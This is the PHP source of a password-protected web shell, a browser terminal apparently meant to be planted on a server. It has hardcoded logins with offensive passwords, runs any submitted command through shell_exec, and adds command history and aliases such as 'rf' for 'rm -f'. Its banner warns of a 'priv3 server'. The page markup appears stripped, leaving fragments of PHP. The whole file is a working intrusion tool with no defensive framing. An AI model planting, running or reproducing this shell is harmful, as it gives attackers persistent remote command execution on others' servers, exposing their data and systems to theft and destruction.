<?php 


error_reporting(0); 
session_start(); 

unset($user);    // Just in case ;-] 
unset($pass); 

if ($_POST['cmd']) $_POST['cmd'] = my_encode($_POST['cmd']); 

$cache_lines = 1000; 
$history_lines = 100;    
$history_chars = 20;                            

$user[] = "root";        $pass[] = md5("fuckyou");    
$user[] = "user";      $pass[] = md5("fuckhacker"); 

$alias = array( 
    "la"    => "ls -la", 
    "rf"    => "rm -f", 
    "unbz2" => "tar -xjpf", 
    "ungz"  => "tar -xzpf" 
); 



if (!$_SESSION['user']) { 

    $pr_login = "Login:\n"; 
    $pr_pass = "Password:\n"; 
    $err = "Invalid login!\n\n"; 
    $succ = "Warning! 
Don`t be stupid .. this is a priv3 server, so take extra care!!!\n\n"; 

    if ($_SESSION['login'] && $_POST['cmd']) { // WE HAVE USERNAME & PASSWORD 

        $_SESSION['output'] .= $pr_pass; 

        if (in_array($_SESSION['login'], $user)) { //........ USERNAME EXISTS 

            $key = array_search($_SESSION['login'], $user); 

            if ($pass[$key] != md5($_POST['cmd'])) { //....... WRONG PASSWORD 
                $_SESSION['output'] .= $err; 
                unset($_SESSION['login']); 
                $prompt = $pr_login; 

            } else { //..................................... SUCCESSFUL LOGIN 
                $_SESSION['user'] = $_SESSION['login']; 
                $_SESSION['whoami'] = substr(shell_exec("whoami"), 0, -1); 
                $_SESSION['host'] = substr(shell_exec("uname -n"), 0, -1); 
                $_SESSION['dir'] = substr(shell_exec("pwd"), 0, -1); 
                $_SESSION['output'] .= $succ; 
                $prompt = set_prompt(); 
                unset($_SESSION['login']); 
            } 

        } else { //......................................... NO SUCH USERNAME 
            $_SESSION['output'] .= $err; 
            unset($_SESSION['login']); 
            $prompt = $pr_login; 
        } 

    } else { //................................................ LOGIN PROCESS 

        if (!$_SESSION['login'] && !$_POST['cmd']) $prompt = $pr_login; 

        if (!$_SESSION['login'] && $_POST['cmd']) { 
            $_SESSION['login'] = $_POST['cmd']; 
            $_SESSION['output'] .= substr($pr_login, 0, -1) . " $_POST[cmd]\n"; 
            $prompt = $pr_pass; 
        } 
    } 

} else { //........................................................ LOGGED IN 



                            /*=-- MEMBERS AREA --=*\ 
                            \*=-- MEMBERS AREA --=*/ 


    $prompt = set_prompt(); 

    chdir($_SESSION['dir']); 

    if ($_REQUEST['clear_hist']) //............................ CLEAR HISTORY 
        $_SESSION['history'] = ""; 

    if ($_SESSION['history']) $hist_arr = explode("\n", $_SESSION['history']); 

    if ($_POST['cmd']) { 

        if (!in_array($_POST['cmd'], $hist_arr)) { //......... ADD TO HISTORY 
            $hist_arr[] = $_POST['cmd']; 
            $_SESSION['history'] = implode("\n", $hist_arr); 
        } 

        if (count($hist_arr) > $history_lines) { //........... CUTOFF HISTORY 
            $start = count($hist_arr) - $history_lines; 
            $_SESSION['history'] = ""; 

            for ($i = $start; $i < count($hist_arr); $i++) 
                $_SESSION['history'] .= $hist_arr[$i] . "\n"; 

            $_SESSION['history'] = substr($_SESSION['history'], 0, -1); 
            $hist_arr = explode("\n", $_SESSION['history']); 
        } 

        $first_word = first_word($_POST['cmd']); 

        if (array_key_exists($first_word, $alias)) { //. CHECKING FOR ALIASES 
            $_POST['cmd'] = $alias[$first_word] . substr($_POST['cmd'], strlen($first_word)); 
            $first_word = first_word($_POST['cmd']); 
        } 

        switch ($first_word) { 

          case "clear": 
            $_SESSION['output'] = ""; 
            break; 

          case "exit": 
            session_destroy(); 
            refresh(); 
            break; 

          case "cd": 
            $_SESSION['output'] .= $prompt; 
            $result = shell_exec($_POST['cmd'] . " 2>&1 ; pwd"); 
            $result = explode("\n", $result); 
            $_SESSION['dir'] = $result[count($result) - 2]; 

            if (count($result) > 2) //.............. WE HAVE AN ERROR MESSAGE 
                $result[0] = "\n" . substr($result[0], strpos($result[0], "cd: ")) . "\n"; 
            else $result[0] = "\n"; 

            $prompt = set_prompt(); 
            $_SESSION['output'] .= $_POST['cmd'] . $result[0]; 
            break; 

          default: 
            $result = shell_exec($_POST['cmd'] . " 2>&1"); 

            if (substr($result, -1) != "\n") $result .= "\n"; 
            $_SESSION['output'] .= $prompt . $_POST['cmd'] . "\n" . $result; 

            $rows = preg_match_all('/\n/', $_SESSION['output'], $arr); 
            unset($arr); 

            if ($rows > $cache_lines) { 
                preg_match('/(\n[^\n]*){' . $cache_lines . '}$/', $_SESSION['output'], $out); 
                $_SESSION['output'] = $out[0] . "\n"; 
            } 
        } 
    } 
} 



                             /*=-- FUNCTIONS --=*\ 
                             \*=-- FUNCTIONS --=*/ 


function my_encode($str) { 
    $str = str_replace("\\\\", "\\", $str); 
    $str = str_replace("\\\"", "\"", $str); 
    $str = str_replace("\\'", "'", $str); 

    while (strpos($str, "  ") !== false) $str = str_replace("  ", " ", $str); 

    return rtrim(ltrim($str)); 
} 

function set_prompt() { 
    global $_SESSION; 

    return $_SESSION['whoami'] . "@" . $_SESSION['host'] . " " . substr($_SESSION['dir'], strrpos($_SESSION['dir'], "/") + 1) . " $ "; 
} 

function first_word($str) { 
    list($str) = preg_split('/[ ;]/', $str); 
    return $str; 
} 

function refresh() { 
    global $_SERVER; 

    $self = substr($_SERVER['SCRIPT_NAME'], strrpos($_SERVER['SCRIPT_NAME'], "/") + 1); 
    header("Location: $self"); 
    die; 
} 



                             /*=-- HTML PAGE --=*\ 
                             \*=-- HTML PAGE --=*/ 


$out = substr(preg_replace('/<\/(textarea)/i', '&lt;/\1', $_SESSION['output']), 0, -1); 

?><?php 

foreach ($hist_arr as $key => $value) { 
    $value = str_replace("\\", "\\\\", $value); 
    $value = str_replace("\"", "\\\"", $value); 
    echo "hist_arr[$key] = \"$value\";\n"; 
} 

?><?php 

if ($hist_arr) { 

    ?><?php 

    for ($i = count($hist_arr) - 1; $i >= 0; $i--) { 

        if (strlen($hist_arr[$i]) > $history_chars) $option = substr($hist_arr[$i], 0, $history_chars - 3) . "..."; 
        else $option = $hist_arr[$i]; 

        echo "<OPTION VALUE=\"" . $i . "\">$option</OPTION>"; 
    } 

      ?><?php 

} 

  ?>